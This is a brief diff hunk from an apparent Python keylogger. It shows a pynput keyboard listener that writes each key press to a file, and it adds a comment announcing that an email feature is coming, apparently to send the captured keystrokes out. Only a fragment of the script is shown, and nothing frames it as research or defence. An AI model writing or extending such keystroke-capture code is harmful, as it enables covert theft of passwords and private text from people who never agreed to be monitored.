@@ -22,6 +22,7 @@ def write_to_file(key):
 with Listener(on_press=write_to_file) as l:
     l.join()
 
+    # Soon Email Feature Will be available 
 
 # 'with' will automatically close the listener. When we stop the program the memory allocated
 # to this listener won't be released. 'with' makes sure whatever happens, when an error is there
